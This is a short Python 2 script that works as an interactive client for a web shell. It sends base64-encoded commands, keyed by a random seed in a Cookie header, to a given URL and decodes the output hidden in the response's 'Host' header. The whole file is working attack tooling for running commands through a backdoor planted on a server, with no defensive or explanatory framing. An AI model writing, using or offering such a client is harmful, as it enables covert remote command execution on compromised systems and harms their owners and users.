#!/usr/bin/env python

import sys
import urllib2
import urllib
import random
import base64
import readline

if len(sys.argv) != 2:
	print '[*] %s <url>\n' % sys.argv[0]
	exit()

print '[+] Connecting...\n'
cmd = ''
while('exit' not in cmd):
	try:
		semilla = random.randint(111111111, 9999999999)
		cmd = raw_input("> ")
		cmd = '%s%s' % (semilla, cmd)
		post = '1=' + base64.b64encode(cmd)
		headers = {'Cookie': str(semilla)}
		req = urllib2.Request(sys.argv[1], post, headers)
		rsp = urllib2.urlopen(req)
		output = base64.b64decode(rsp.headers['Host'])
		print output
	except Exception as e:
		print 'Error: %s\n' % e.message
		print 'Headers: %s\n' % rsp.headers
